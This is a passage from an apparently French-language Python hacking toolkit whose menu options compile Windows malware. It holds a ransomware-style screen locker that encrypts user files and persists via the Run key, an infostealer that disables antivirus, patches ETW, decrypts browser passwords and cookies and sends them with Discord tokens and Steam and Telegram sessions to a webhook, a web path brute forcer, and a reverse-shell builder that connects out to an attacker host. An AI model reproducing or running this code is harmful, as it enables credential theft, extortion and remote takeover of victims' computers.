            # Couleur : blanc pour la tete, vert pour la trainee
            color = "#ffffff"
            
            self.canvas.create_text(
                x, y, text=char, font=self.font, fill=color, tags="matrix"
            )
            
            if y > self.height and random.random() > 0.975:
                self.drops[i] = 0
            else:
                self.drops[i] += 1

        self.root.after(50, self._animate_matrix)

    def check_code(self, event):
        if self.code_var.get() == UNLOCK_CODE:
            self.unlock()
        else:
            self.code_var.set("")
            self._glitch_error()

    def _glitch_error(self):
        # Effet de vibration
        orig_x = self.ui_frame.winfo_x()
        for offset in (-20, 20, -15, 15, -5, 5, 0):
            self.ui_frame.place_configure(x=orig_x + offset)
            self.root.update_idletasks()
            time.sleep(0.02)
        self.ui_frame.place_configure(x=orig_x)

        # Changement de couleur temporaire
        self.title_label.config(fg="#ffffff", text="ACCESS DENIED")
        self.root.after(800, lambda: self.title_label.config(fg="#ffffff", text=MESSAGE))

    def unlock(self):
        self.anim_running = False
        self.title_label.config(fg="#ffffff", text="DECRYPTING...")
        self.sub_label.config(text="Please wait, restoring files...")
        self.entry.destroy()
        self.root.update()
        
        # Lance le dechiffrement dans un thread pour ne pas figer l'UI
        threading.Thread(target=self._do_unlock, daemon=True).start()

    def _do_unlock(self):
        # Dechiffre les fichiers
        process_files("decrypt", self.key)
        
        # Nettoie le systeme
        unblock_system()
        remove_persistence()
        
        # Ferme l'UI
        self.root.after(1000, self.root.destroy)

    def run(self):
        self.entry.focus_set()
        self.root.mainloop()

# ============================================================
#   PERSISTANCE
# ============================================================

def install_persistence():
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WinSecurityGuard", 0, winreg.REG_SZ, f'"{sys.executable}"')
        winreg.CloseKey(k)
    except Exception:
        pass

def remove_persistence():
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        try:
            winreg.DeleteValue(k, "WinSecurityGuard")
        except FileNotFoundError:
            pass
        winreg.CloseKey(k)
    except Exception:
        pass

# ============================================================
#   MAIN
# ============================================================

def main():
    if os.name != "nt":
        sys.exit(1)

    # Derive la cle cryptographique
    key = derive_key(UNLOCK_CODE)

    # Chiffre les fichiers en arriere-plan AVANT de lancer l'UI
    if DO_ENCRYPT:
        threading.Thread(target=process_files, args=("encrypt", key), daemon=True).start()

    install_persistence()
    block_system()
    setup_keyboard_hook()

    try:
        app = MatrixLocker(key)
        app.run()
    except Exception:
        unblock_system()
        remove_persistence()
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except Exception:
        pass
'''

    safe_msg = custom_msg.replace('"', '\\"').replace("\\", "\\\\").replace("\n", "\\n")

    src = payload.replace("__UNLOCK_CODE__", unlock_code)
    src = src.replace("__MESSAGE__", safe_msg)
    src = src.replace("__DO_ENCRYPT__", encrypt_files)

    tmp = _safe_tmp("_locker_v2.py")
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(src)

    try:
        import PyInstaller  # noqa
    except ImportError:
        print(f"{YELLOW}[+] Installation de PyInstaller...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pyinstaller"], cwd=_safe_cwd(), check=True)

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_locker_v2")
    spec_dir = _safe_workdir()
    exe_name = "SystemGuard"

    print(f"\n{YELLOW}[+] Compilation du locker (Integration Crypto)...{RESET}")

    args = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--clean", "--noconfirm",
        "--name", exe_name,
        "--distpath", dist_dir,
        "--workpath", work_dir,
        "--specpath", spec_dir,
        "--hidden-import=tkinter",
        "--hidden-import=tkinter.font",
        "--hidden-import=Crypto",
        "--hidden-import=Crypto.Cipher",
        "--hidden-import=Crypto.Cipher.AES",
        "--runtime-tmpdir", "%TEMP%",
        tmp,
    ]

    r = subprocess.run(args, capture_output=True, text=True, cwd=_safe_cwd())
    if r.returncode != 0:
        print(f"{RED}[-] Echec compilation.{RESET}")
        print(r.stderr[-1500:])
        pause()
        return

    exe_path = os.path.join(dist_dir, f"{exe_name}.exe")
    print(f"\n{GREEN}[+] TERMINE : {exe_path}{RESET}")
    print(f"  {GREEN}Code de déchiffrement : {WHITE}{unlock_code}{RESET}")
    print(f"  {GREEN}Chiffrement actif     : {WHITE}{encrypt_files}{RESET}")
    print(f"{RED}[!] ATTENTION : L'exe va chiffrer le Bureau/Documents au lancement.{RESET}")
    print(f"{RED}[!] Ne le lance sur ta machine QUE si tu es pret a taper le code pour tout restaurer.{RESET}")
    print()

    for p in [tmp, os.path.join(spec_dir, f"{exe_name}.spec"), work_dir]:
        try:
            if os.path.isdir(p):
                shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass

    pause()
    
def option_42():
    clear()
    banner()

    print(f"\n{CYAN}   [ ULTIMATE STEALER BUILDER ]{RESET}\n")
    print(f"{GRAY}  Tue les AV, grab tous les navigateurs, Discord, Steam, Telegram.{RESET}\n")

    webhook = input(f"{YELLOW}[?]{RESET} Webhook URL {RED}->{RESET} ").strip()
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print(f"{RED}[!] Webhook Discord invalide.{RESET}")
        pause()
        return

    payload = r'''# -*- coding: utf-8 -*-
import os, sys, json, base64, sqlite3, shutil, tempfile, socket, platform
import subprocess, ctypes, re, time, glob, zipfile, winreg
from ctypes import wintypes

WEBHOOK = "__WEBHOOK__"

# ============================================================
# 1. KILL AV (Nécessite les droits admin)
# ============================================================
def kill_av():
    if os.name != "nt": return
    def _run(cmd):
        try: subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
        except: pass

    cmds = [
        'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
        'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
        'powershell -Command "Add-MpPreference -ExclusionPath C:\\"',
        "sc stop WinDefend", "sc config WinDefend start= disabled",
        r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
    ]
    for c in cmds: _run(c)
    
    avs = ["MsMpEng.exe", "NisSrv.exe", "avastsvc.exe", "avgsvc.exe", "avp.exe"]
    for av in avs: _run(f"taskkill /F /IM {av} /T")

# ============================================================
# 2. ETW PATCHING (Furtivité)
# ============================================================
def patch_etw():
    try:
        kernel32 = ctypes.windll.kernel32
        etw_addr = ctypes.cast(
            kernel32.GetProcAddress(kernel32.GetModuleHandleA(b"ntdll.dll"), b"EtwEventWrite"),
            ctypes.c_void_p
        )
        old_protect = ctypes.c_ulong(0)
        kernel32.VirtualProtect(etw_addr, 0x10, 0x40, ctypes.byref(old_protect))
        ctypes.memmove(etw_addr, b"\xB8\x00\x00\x00\xC0\xC3", 6)
        kernel32.VirtualProtect(etw_addr, 0x10, old_protect.value, ctypes.byref(old_protect))
    except Exception:
        pass

patch_etw()

# ============================================================
# 3. IMPORTS
# ============================================================
try:
    import requests
    from Crypto.Cipher import AES
except ImportError:
    sys.exit(1)

HTTP = requests.Session()
HTTP.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"})

# ============================================================
# 4. DPAPI NATIF
# ============================================================
class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

def dpapi_decrypt(encrypted_data):
    try:
        buffer_in = ctypes.create_string_buffer(encrypted_data)
        blob_in = DATA_BLOB(len(encrypted_data), ctypes.cast(buffer_in, ctypes.POINTER(ctypes.c_char)))
        blob_out = DATA_BLOB()

        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        ):
            decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return decrypted
    except Exception:
        pass
    return None

# ============================================================
# 5. WEBHOOK HELPERS
# ============================================================
def send_embed(title, desc, color=0xFFFFFF):
    try:
        HTTP.post(WEBHOOK, json={"embeds": [{"title": title, "description": desc[:4000], "color": color}]}, timeout=15)
    except Exception: pass

def send_file(path, filename, desc=""):
    try:
        with open(path, "rb") as f:
            HTTP.post(WEBHOOK, files={"file": (filename, f.read())}, data={"content": desc}, timeout=60)
    except Exception: pass

# ============================================================
# 6. SYSINFO
# ============================================================
def grab_sysinfo():
    try: ip = HTTP.get("https://api.ipify.org", timeout=5).text
    except: ip = "Inconnu"
    info = (
        f"**Hostname** : `{socket.gethostname()}`\n"
        f"**User** : `{os.getlogin()}`\n"
        f"**OS** : `{platform.system()} {platform.release()}`\n"
        f"**IP** : `{ip}`"
    )
    send_embed("Sysinfo", info, 0xFFFFFF)

# ============================================================
# 7. STEALER NAVIGATEURS & COOKIES (Inspiré de programme9.py)
# ============================================================
BROWSERS = {
    "Chrome": os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"),
    "Edge": os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"),
    "Brave": os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data"),
    "Vivaldi": os.path.join(os.getenv("LOCALAPPDATA", ""), "Vivaldi", "User Data"),
    "Opera": os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera Stable"),
    "Opera GX": os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera GX Stable"),
    "Yandex": os.path.join(os.getenv("LOCALAPPDATA", ""), "Yandex", "YandexBrowser", "User Data"),
}

def get_master_key(browser_path):
    ls = os.path.join(browser_path, "Local State")
    if not os.path.isfile(ls): return None
    try:
        with open(ls, "r", encoding="utf-8") as f: data = json.load(f)
        enc_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        return dpapi_decrypt(enc_key[5:])
    except Exception:
        return None

def decrypt_val(enc, key):
    if not key or not enc: return ""
    try:
        if enc[:3] in (b"v10", b"v11"):
            iv = enc[3:15]
            payload = enc[15:-16]
            tag = enc[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(payload, tag).decode("utf-8", errors="ignore")
        return dpapi_decrypt(enc).decode("utf-8", errors="ignore")
    except Exception:
        return ""

def profiles(root):
    if not os.path.isdir(root): return []
    out = []
    default = os.path.join(root, "Default")
    if os.path.isdir(default): out.append(default)
    try:
        for d in sorted(os.listdir(root)):
            if d.startswith("Profile ") and os.path.isdir(os.path.join(root, d)):
                out.append(os.path.join(root, d))
    except: pass
    return out

def grab_browsers():
    all_data = {}
    for bname, bpath in BROWSERS.items():
        if not os.path.isdir(bpath): continue
        key = get_master_key(bpath)
        if not key: continue
        
        pws = []
        cks = []
        for prof in profiles(bpath):
            # Mots de passe
            db = os.path.join(prof, "Login Data")
            if os.path.isfile(db):
                tmp = os.path.join(tempfile.gettempdir(), f"_pw_{os.getpid()}.db")
                try:
                    shutil.copy2(db, tmp)
                    conn = sqlite3.connect(tmp)
                    for row in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
                        if row[2]:
                            pwd = decrypt_val(row[2], key)
                            if pwd: pws.append({"url": row[0], "user": row[1], "pass": pwd})
                    conn.close()
                except: pass
                finally:
                    try: os.remove(tmp)
                    except: pass
            
            # Cookies
            for c in [os.path.join(prof, "Network", "Cookies"), os.path.join(prof, "Cookies")]:
                if os.path.isfile(c):
                    tmp = os.path.join(tempfile.gettempdir(), f"_ck_{os.getpid()}.db")
                    try:
                        shutil.copy2(c, tmp)
                        conn = sqlite3.connect(tmp)
                        for row in conn.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 500"):
                            if row[2]:
                                val = decrypt_val(row[2], key)
                                if val: cks.append({"host": row[0], "name": row[1], "val": val})
                        conn.close()
                    except: pass
                    finally:
                        try: os.remove(tmp)
                        except: pass
                    break
        
        if pws or cks:
            all_data[bname] = {"passwords": pws, "cookies": cks}

    # Envoi groupé
    for bname, bdata in all_data.items():
        if bdata["passwords"]:
            lines = [f"`{p['url'][:50]}` | `{p['user']}` | `{p['pass']}`" for p in bdata["passwords"][:20]]
            send_embed(f"MDP {bname} ({len(bdata['passwords'])})", "\n".join(lines), 0xFFFFFF)
        if bdata["cookies"]:
            lines = [f"`{c['host']}` | `{c['name']}` = `{c['val'][:40]}`" for c in bdata["cookies"][:20]]
            send_embed(f"Cookies {bname} ({len(bdata['cookies'])})", "\n".join(lines), 0xFFFFFF)

# ============================================================
# 8. FIREFOX
# ============================================================
def grab_firefox():
    profiles_path = os.path.join(os.getenv("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
    if not os.path.isdir(profiles_path): return
    for prof in os.listdir(profiles_path):
        prof_dir = os.path.join(profiles_path, prof)
        if not os.path.isdir(prof_dir): continue
        logins_file = os.path.join(prof_dir, "logins.json")
        if os.path.isfile(logins_file):
            try:
                with open(logins_file, "r", encoding="utf-8") as f:
                    data = json.load(f)
                logins = data.get("logins", [])
                if logins:
                    lines = [f"`{l.get('hostname', '')}` | user: `{l.get('encryptedUsername', '')[:20]}...`" for l in logins]
                    send_embed(f"Firefox MDP ({prof[:15]})", "\n".join(lines[:20]), 0xFFFFFF)
            except: pass

# ============================================================
# 9. DISCORD TOKENS
# ============================================================
def grab_discord():
    paths = [
        os.path.join(os.getenv("APPDATA", ""), "discord", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA", ""), "discordcanary", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA", ""), "discordptb", "Local Storage", "leveldb"),
    ]
    for b_name, b_path in BROWSERS.items():
        paths.append(os.path.join(b_path, "Default", "Local Storage", "leveldb"))

    token_re = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}")
    tokens = set()
    
    for p in paths:
        if not os.path.isdir(p): continue
        tmp_ldb = os.path.join(tempfile.gettempdir(), f"ldb_{os.getpid()}_{os.urandom(4).hex()}")
        try: shutil.copytree(p, tmp_ldb)
        except: continue

        for root, _, files in os.walk(tmp_ldb):
            for f in files:
                if not f.endswith((".ldb", ".log")): continue
                try:
                    with open(os.path.join(root, f), "r", errors="ignore") as file:
                        content = file.read()
                        for match in token_re.findall(content):
                            tokens.add(match)
                except: pass
        try: shutil.rmtree(tmp_ldb, ignore_errors=True)
        except: pass

    valid = []
    for t in tokens:
        try:
            r = HTTP.get("https://discord.com/api/v9/users/@me", headers={"Authorization": t}, timeout=5)
            if r.status_code == 200:
                u = r.json()
                valid.append(f"**{u.get('username')}** (ID: {u.get('id')})\n`{t}`")
        except: pass
    if valid: send_embed(f"Tokens Discord ({len(valid)})", "\n\n".join(valid[:10]), 0xFFFFFF)

# ============================================================
# 10. STEAM & TELEGRAM
# ============================================================
def grab_steam():
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
        path, _ = winreg.QueryValueEx(k, "SteamPath")
        winreg.CloseKey(k)
        if os.path.isdir(path):
            zip_path = os.path.join(tempfile.gettempdir(), f"steam_{os.getpid()}.zip")
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
                lu = os.path.join(path, "config", "loginusers.vdf")
                if os.path.isfile(lu): z.write(lu, "loginusers.vdf")
                for ssfn in glob.glob(os.path.join(path, "ssfn*")):
                    if os.path.isfile(ssfn): z.write(ssfn, os.path.basename(ssfn))
            send_file(zip_path, "steam_config.zip", "Steam Tokens")
            try: os.remove(zip_path)
            except: pass
    except: pass

def grab_telegram():
    tdata = os.path.join(os.getenv("APPDATA", ""), "Telegram Desktop", "tdata")
    if os.path.isdir(tdata):
        zip_path = os.path.join(tempfile.gettempdir(), f"tg_{os.getpid()}.zip")
        try:
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
                for root, _, files in os.walk(tdata):
                    for f in files:
                        full = os.path.join(root, f)
                        z.write(full, os.path.relpath(full, os.path.dirname(tdata)))
            send_file(zip_path, "telegram_tdata.zip", "Telegram Session")
            try: os.remove(zip_path)
            except: pass
        except: pass

# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    if os.name != "nt": sys.exit(0)
    kill_av()
    time.sleep(1)
    grab_sysinfo()
    grab_browsers()
    grab_firefox()
    grab_discord()
    grab_steam()
    grab_telegram()
'''

    src = payload.replace("__WEBHOOK__", webhook)
    tmp_payload_path = _safe_tmp("_stealer_ultimate.py")
    with open(tmp_payload_path, "w", encoding="utf-8") as f: 
        f.write(src)

    try: 
        import PyInstaller
    except ImportError: 
        print(f"{YELLOW}[+] Installation de PyInstaller...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], cwd=_safe_cwd(), check=True)

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_stealer_ult")
    spec_dir = _safe_workdir()

    print(f"\n{YELLOW}[+] Compilation en cours...{RESET}")

    args = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--clean", "--noconfirm",
        "--name", "stealer_ultimate",
        "--distpath", dist_dir,
        "--workpath", work_dir,
        "--specpath", spec_dir,
        "--hidden-import=requests",
        "--hidden-import=Crypto",
        "--hidden-import=Crypto.Cipher",
        "--hidden-import=Crypto.Cipher.AES",
        "--uac-admin",
        "--runtime-tmpdir", "%TEMP%",
        tmp_payload_path,
    ]

    r = subprocess.run(args, capture_output=True, text=True, cwd=_safe_cwd())
    if r.returncode != 0:
        print(f"{RED}[-] Echec compilation.{RESET}")
        print(r.stderr[-1500:])
        pause()
        return

    exe_path = os.path.join(dist_dir, "stealer_ultimate.exe")
    print(f"\n{GREEN}[+] Termine : {exe_path}{RESET}")
    print(f"{GREEN}[+] Taille : {os.path.getsize(exe_path) / (1024 * 1024):.1f} MB{RESET}")
    
    try:
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        if os.path.exists(desktop):
            final_exe = os.path.join(desktop, "stealer_ultimate.exe")
            shutil.copy2(exe_path, final_exe)
            print(f"{GRAY}[i] Copie sur le bureau : {final_exe}{RESET}")
    except Exception:
        pass

    for p in [tmp_payload_path, os.path.join(spec_dir, "stealer_ultimate.spec"), work_dir]:
        try:
            if os.path.isdir(p): shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p): os.remove(p)
        except: pass

    pause()


def option_43():
    clear()
    banner()

    if not _need_requests():
        pause()
        return

    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    print(f"\n{CYAN}   [ WEB BRUTE FORCE ]{RESET}\n")
    print(f"{GRAY}  Teste des chemins sur un site web a partir d'une wordlist.{RESET}")
    print(f"{GRAY}  Gere les redirections, filtre les faux positifs par taille.{RESET}\n")

    # 1. Saisie de l'URL
    url = input(f"{YELLOW}[?]{RESET} URL cible (ex: https://site.com) {RED}->{RESET} ").strip()
    if not url:
        print(f"{RED}[!] URL vide.{RESET}")
        pause()
        return

    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    url = url.rstrip("/")

    # 2. Saisie de la wordlist
    wl_path = input(f"{YELLOW}[?]{RESET} Chemin de la wordlist {RED}->{RESET} ").strip().strip('"').strip("'")
    if not wl_path or not os.path.isfile(wl_path):
        print(f"{RED}[!] Fichier introuvable : {wl_path}{RESET}")
        pause()
        return

    try:
        with open(wl_path, "r", encoding="utf-8", errors="ignore") as f:
            wordlist = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
    except Exception as e:
        print(f"{RED}[!] Lecture impossible : {e}{RESET}")
        pause()
        return

    if not wordlist:
        print(f"{RED}[!] Wordlist vide.{RESET}")
        pause()
        return

    print(f"{GREEN}[+] {len(wordlist)} entrees chargees.{RESET}")

    # 3. Options
    print(f"\n{CYAN}   OPTIONS{RESET}\n")
    try:
        threads = int(input(f"{YELLOW}[?]{RESET} Threads (def 30) {RED}->{RESET} ").strip() or "30")
        threads = max(1, min(200, threads))
    except ValueError:
        threads = 30

    try:
        timeout = float(input(f"{YELLOW}[?]{RESET} Timeout par requete (def 6s) {RED}->{RESET} ").strip() or "6")
        timeout = max(1, min(60, timeout))
    except ValueError:
        timeout = 6

    ext = input(f"{YELLOW}[?]{RESET} Extension a ajouter (vide = aucune, ex: .php) {RED}->{RESET} ").strip()

    follow = input(f"{YELLOW}[?]{RESET} Suivre les redirections (y/n, def n) {RED}->{RESET} ").strip().lower() in ("y", "yes", "o", "oui")

    # 4. Test de connexion initiale (pour etablir la baseline)
    print(f"\n{YELLOW}[*] Test de connexion initiale...{RESET}")
    try:
        r_base = requests.get(
            url,
            headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
            timeout=timeout,
            verify=False,
            allow_redirects=follow,
        )
        base_status = r_base.status_code
        base_size = len(r_base.content)
        print(f"{GREEN}[+] HTTP {base_status} — {base_size} bytes{RESET}")
    except Exception as e:
        print(f"{RED}[!] Connexion impossible : {e}{RESET}")
        pause()
        return

    # 5. Fonction de test d'un chemin
    results = []
    lock = threading.Lock()
    done = [0]
    total = len(wordlist)
    start_time = time.time()

    def check_path(path):
        # Nettoyage du chemin
        clean = path.lstrip("/")
        if ext and not clean.endswith(ext):
            clean += ext

        target_url = f"{url}/{clean}"

        try:
            r = requests.get(
                target_url,
                headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
                timeout=timeout,
                verify=False,
                allow_redirects=follow,
                stream=True,
            )
            
            # On lit les premiers bytes pour avoir la taille
            size = len(r.content) if hasattr(r, "content") else 0
            status = r.status_code
            r.close()

            # Filtrage des faux positifs
            is_false_positive = False
            if status == base_status and size == base_size:
                is_false_positive = True
            elif size == 0 and status == 200:
                is_false_positive = True

            with lock:
                done[0] += 1
                
                if not is_false_positive and status in (200, 301, 302, 403, 401, 500):
                    color = GREEN if status == 200 else (YELLOW if status in (301, 302) else PINK)
                    results.append({
                        "path": clean,
                        "status": status,
                        "size": size,
                        "url": target_url,
                    })
                    sys.stdout.write(
                        f"\r{' ' * 100}\r"
                        f"{color}[{status}]{RESET} "
                        f"{WHITE}/{clean:<45}{RESET} "
                        f"{GRAY}{size:>7}b{RESET}\n"
                    )
                    sys.stdout.flush()

                # Barre de progression
                ratio = done[0] / total
                bar_len = 30
                filled = int(bar_len * ratio)
                bar = "█" * filled + "░" * (bar_len - filled)
                pct = int(ratio * 100)
                sys.stdout.write(
                    f"\r{' ' * 100}\r"
                    f"{PURPLE}[{bar}]{RESET} {WHITE}{pct:3d}%{RESET}  "
                    f"{GRAY}{done[0]}/{total}{RESET}  "
                    f"{CYAN}found:{len(results)}{RESET}"
                )
                sys.stdout.flush()

        except requests.exceptions.Timeout:
            with lock:
                done[0] += 1
        except requests.exceptions.ConnectionError:
            with lock:
                done[0] += 1
        except Exception:
            with lock:
                done[0] += 1

    # 6. Lancement
    print(f"\n{CYAN}   CONFIGURATION{RESET}")
    print(f"  {GREEN}Cible     : {WHITE}{url}{RESET}")
    print(f"  {GREEN}Wordlist  : {WHITE}{len(wordlist)} entrees{RESET}")
    print(f"  {GREEN}Threads   : {WHITE}{threads}{RESET}")
    print(f"  {GREEN}Timeout   : {WHITE}{timeout}s{RESET}")
    print(f"  {GREEN}Extension : {WHITE}{ext or 'aucune'}{RESET}")
    print(f"  {GREEN}Redirects : {WHITE}{'suivies' if follow else 'non suivies'}{RESET}")
    print()

    confirm = input(f"{YELLOW}[?]{RESET} Lancer le brute force ? (y/n) {RED}->{RESET} ").strip().lower()
    if confirm not in ("y", "yes", "o", "oui"):
        print(f"{YELLOW}[!] Annule.{RESET}")
        pause()
        return

    print(f"\n{CYAN}[*] Bruteforce en cours...{RESET}\n")

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        list(ex.map(check_path, wordlist))

    elapsed = time.time() - start_time

    # 7. Rapport final
    print(f"\n\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   BRUTE FORCE TERMINE — {url}{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    if results:
        print(f"{GREEN}{BOLD}   CHEMINS TROUVES ({len(results)}){RESET}\n")
        results.sort(key=lambda x: (x["status"], x["path"]))
        for r in results:
            color = GREEN if r["status"] == 200 else (YELLOW if r["status"] in (301, 302) else PINK)
            print(f"  {color}[{r['status']}]{RESET} "
                  f"{WHITE}/{r['path']:<45}{RESET} "
                  f"{GRAY}{r['size']:>7}b{RESET}")
    else:
        print(f"{YELLOW}   Aucun chemin trouve.{RESET}")

    print(f"\n{CYAN}   STATS{RESET}")
    print(f"  {GREEN}Trouves  : {WHITE}{len(results)}{RESET}")
    print(f"  {GREEN}Testes   : {WHITE}{total}{RESET}")
    print(f"  {GREEN}Duree    : {WHITE}{elapsed:.2f}s{RESET}")
    print(f"  {GREEN}Vitesse  : {WHITE}{total / elapsed:.0f} req/s{RESET}")

    # 8. Export
    try:
        out_dir = Path(_safe_workdir()) / "Output" / "WebBruteForce"
        out_dir.mkdir(parents=True, exist_ok=True)
        host = urllib.parse.urlparse(url).hostname or "target"
        safe_host = re.sub(r"[^\w\-.]", "_", host)[:40]
        out_file = out_dir / f"brute_{safe_host}_{int(time.time())}.txt"

        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"Web Brute Force — {url}\n")
            f.write(f"Date : {datetime.now().isoformat()}\n")
            f.write(f"Wordlist : {wl_path}\n")
            f.write(f"Total : {len(results)}\n")
            f.write("=" * 60 + "\n\n")
            for r in results:
                f.write(f"[{r['status']}] {r['path']:<45} {r['size']:>7}b  {r['url']}\n")

        print(f"\n{GREEN}[+] Rapport : {out_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    pause()

# ============================================================
#              OPTION 44 — C2 / REVERSE SHELL BUILDER
# ============================================================
# Genere un exe Windows qui ouvre un reverse shell TCP vers ton IP
# et ton port. Une fois connecte, tu as un shell distant (cmd.exe).
# Rien de plus simple pour reprendre la main sur une machine.
# ============================================================

def option_44():
    clear()
    banner()

    print(f"\n{CYAN}   [ C2 / REVERSE SHELL BUILDER ]{RESET}\n")
    print(f"{GRAY}  Genere un exe qui ouvre un reverse shell TCP vers ta machine.{RESET}\n")

    # --- Cible ---
    lhost = input(f"{YELLOW}[?]{RESET} Ton IP (LHOST) {RED}->{RESET} ").strip()
    if not lhost:
        print(f"{RED}[!] IP vide.{RESET}")
        pause()
        return

    try:
        lport = int(input(f"{YELLOW}[?]{RESET} Ton port (LPORT) {RED}->{RESET} ").strip() or "4444")
        if not (1 <= lport <= 65535):
            raise ValueError
    except ValueError:
        print(f"{RED}[!] Port invalide.{RESET}")
        pause()
        return

    # --- Options ---
    print(f"\n{WHITE}{BOLD}-- Options --{RESET}\n")
    print(f"  {PINK}(1){RESET} Shell interactif (cmd.exe)")
    print(f"  {PINK}(2){RESET} PowerShell interactif")
    print()
    shell_choice = input(f"{YELLOW}[?]{RESET} Choix (1-2, def 1) {RED}->{RESET} ").strip() or "1"
    shell_cmd = "cmd.exe" if shell_choice == "1" else "powershell.exe"

    persist = input(f"{YELLOW}[?]{RESET} Ajouter la persistance au demarrage ? (y/n, def n) {RED}->{RESET} ").strip().lower() in ("y", "yes", "o", "oui")

    # --- Payload ---
    payload = r'''import os, sys, socket, subprocess, time, ctypes

LHOST = "__LHOST__"
LPORT = __LPORT__
SHELL = "__SHELL__"
PERSIST = __PERSIST__

def patch_etw():
    try:
        k = ctypes.windll.kernel32
        addr = ctypes.cast(k.GetProcAddress(k.GetModuleHandleA(b"ntdll.dll"), b"EtwEventWrite"), ctypes.c_void_p)
        old = ctypes.c_ulong(0)
        k.VirtualProtect(addr, 0x10, 0x40, ctypes.byref(old))
        ctypes.memmove(addr, b"\xB8\x00\x00\x00\xC0\xC3", 6)
        k.VirtualProtect(addr, 0x10, old.value, ctypes.byref(old))
    except Exception:
        pass

patch_etw()

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((LHOST, LPORT))
            return s
        except Exception:
            time.sleep(5)

def install_persistence():
    if not PERSIST:
        return
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WinUpdateService", 0, winreg.REG_SZ, f'"{sys.executable}"')
        winreg.CloseKey(k)
    except Exception:
        pass

def main():
    install_persistence()
    while True:
        s = connect()
        s.send(b"[+] Connected to C2\n")
        f = s.makefile("rwb", buffering=0)

        p = subprocess.Popen(
            SHELL, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, shell=False,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )

        import threading
        def read_out():
            while True:
                try:
                    data = p.stdout.read(1)
                    if not data:
                        break
                    f.write(data)
                except Exception:
                    break

        threading.Thread(target=read_out, daemon=True).start()

        while True:
            try:
                cmd = f.readline()
                if not cmd:
                    break
                p.stdin.write(cmd)
                p.stdin.flush()
            except Exception:
                break

        try:
            p.kill()
            s.close()
        except Exception:
            pass
        time.sleep(10)

if __name__ == "__main__":
    main()
'''

    src = payload.replace("__LHOST__", lhost)
    src = src.replace("__LPORT__", str(lport))
    src = src.replace("__SHELL__", shell_cmd)
    src = src.replace("__PERSIST__", "True" if persist else "False")

    tmp = _safe_tmp("_revshell_tmp.py")
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(src)

    try:
        import PyInstaller  # noqa
    except ImportError:
        print(f"{YELLOW}[+] Installation de PyInstaller...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pyinstaller"],
